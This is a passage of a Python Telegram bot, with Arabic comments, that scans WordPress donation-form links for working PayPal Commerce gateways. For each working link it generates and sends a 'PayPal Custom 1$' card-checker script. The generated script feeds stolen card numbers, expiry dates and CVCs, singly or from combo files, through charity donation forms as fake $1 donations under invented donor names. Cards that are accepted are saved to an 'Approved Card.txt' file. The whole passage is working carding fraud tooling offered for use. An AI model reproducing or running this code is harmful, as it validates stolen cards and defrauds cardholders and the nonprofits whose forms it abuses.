                    return None
                response_json = response.json()
                if 'data' not in response_json or 'id' not in response_json['data']:
                    return None
                
                # الرابط شغال ✅
                return {
                    'link': link,
                    'id_form1': id_form1,
                    'id_form2': id_form2,
                    'nonec': nonec,
                    'au': au,
                    'url': USER_URL2,
                    'path': USER_URL
                }
            except:
                return None
        
        # استخدام ThreadPoolExecutor للسرعة
        live_data = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for i, link in enumerate(links, 1):
                future = executor.submit(check_link, link, i)
                futures.append((future, i, link))
            
            for future, i, link in futures:
                try:
                    result = future.result(timeout=15)
                    with processing_status[user_id]['lock']:
                        processing_status[user_id]['processed'] += 1
                        if result:
                            processing_status[user_id]['live'] += 1
                            live_data.append(result)
                        else:
                            processing_status[user_id]['dead'] += 1
                        
                        # تحديث التقدم
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        progress = int((processed / total) * 100)
                        
                        if processed % 5 == 0 or processed == total:
                            bar_length = 20
                            filled = int((progress / 100) * bar_length)
                            bar = '█' * filled + '░' * (bar_length - filled)
                            
                            text = f"""📊 <b>جاري فحص الروابط...</b>
━━━━━━━━━━━━━━━━━━
📌 إجمالي الروابط: {total}
✅ شغالة: {live}
❌ ميتة: {dead}
⏳ التقدم: {progress}% {bar}
━━━━━━━━━━━━━━━━━━
⏱️ تم فحص {processed} من {total}"""
                            
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                            except:
                                pass
                except:
                    with processing_status[user_id]['lock']:
                        processing_status[user_id]['processed'] += 1
                        processing_status[user_id]['dead'] += 1
        
        # النتيجة النهائية
        status = processing_status[user_id]
        
        # إرسال كل رابط حي كملف Python
        if live_data:
            for idx, data in enumerate(live_data, 1):
                code = f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{data['id_form1']}"
        self.id_form2 = "{data['id_form2']}"
        self.nonec = "{data['nonec']}"
        self.au = "{data['au']}"
        url = '{data['link']}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Key(self):
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{
            'authorization': f'Bearer {{self.au}}',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if 'true' in text: return 'CHARGE 1.00$'
        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
        elif 'ORDER_NOT_APPROVED' in text: return "ORDER_NOT_APPROVED"
        else:
            try: return r5.json()['data']['error']
            except: return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    print('━' * 30)
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        try:
            while True:
                ar = input('Enter Card ( n | mm | yy | cvc ): ')
                rr = PayPal()
                itt = rr.Key()
                resulti = rr.Charge(ar)
                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(ar + f': {{resulti}} > {{Getat}}')
                print(f'[{{rr.checked}}] ' + ar + '  >>  ' + resulti)
                time.sleep(1)
        except:
            pass
    else:
        noy = 0
        live = 0
        dead = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            print('Wait Checking Your Card ...')
            print('━' * 30)
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    itt = rr.Key()
                    resulti = rr.Charge(P)
                    if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                        live += 1
                        with open('Approved Card.txt', "a") as f:
                            f.write(P + ': {{resulti}} > {{Getat}}')
                    else:
                        dead += 1
                except:
                    resulti = 'Error'
                    dead += 1
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(1)
            print('━' * 30)
            print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')
            print('━' * 30)'''
                
                file_name = f'gateway_{idx}_{user_id}.py'
                with open(file_name, 'w', encoding='utf-8') as f:
                    f.write(code)
                with open(file_name, 'rb') as f:
                    bot.send_document(
                        chat_id,
                        f,
                        caption=f"""✅ <b>Gateway #{idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{data['link']}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr""",
                        parse_mode="HTML"
                    )
                os.remove(file_name)
                time.sleep(0.3)
            
            # النتيجة النهائية
            final_text = f"""📊 <b>✅ Bulk Extraction Complete!</b>
━━━━━━━━━━━━━━━━━━━━
📌 Total Links: {status['total']}
✅ Live (Extracted): {status['live']}
❌ Dead (Failed): {status['dead']}
💯 Success Rate: {int((status['live']/status['total'])*100) if status['total'] > 0 else 0}%
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr"""
            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        else:
            no_live_text = f"""📊 <b>❌ No live links found!</b>
━━━━━━━━━━━━━━━━━━━━
📌 Total Links: {status['total']}
✅ Live: 0
❌ Dead: {status['dead']}
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr"""
            bot.edit_message_text(no_live_text, chat_id, status_msg.message_id, parse_mode="HTML")
        
        # تنظيف
        if user_id in processing_status:
            del processing_status[user_id]
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)[:100]}")

# === نظام الحظر ===
@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        bot.reply_to(message, f"✅ User ID {user_id_to_block} blocked.")
    except:
        bot.reply_to(message, "Usage: /block2 [user_id]")

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        bot.reply_to(message, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        bot.reply_to(message, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        bot.reply_to(message, "Usage: /unblock2 [user_id]")

# === تشغيل البوت ===
print('✅ Bot is running...')
while True:
    try:
        bot.infinity_polling(none_stop=True, interval=0)
    except Exception as e:
        print(f'❌ Error: {e}')
        time.sleep(5)
